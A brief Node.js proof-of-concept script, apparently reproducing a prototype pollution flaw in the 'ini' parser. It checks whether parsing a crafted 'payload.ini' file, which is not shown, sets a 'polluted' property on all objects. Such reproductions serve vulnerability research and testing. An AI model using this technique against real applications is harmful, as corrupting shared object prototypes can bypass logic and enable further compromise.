var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const fs = require('fs');
const path = require('path');
const ini = require('ini');
obj = {};
console.log({}.polluted);
ini.parse(fs.readFileSync(path.resolve(__dirname, './payload.ini'), 'utf-8'));
console.log({}.polluted);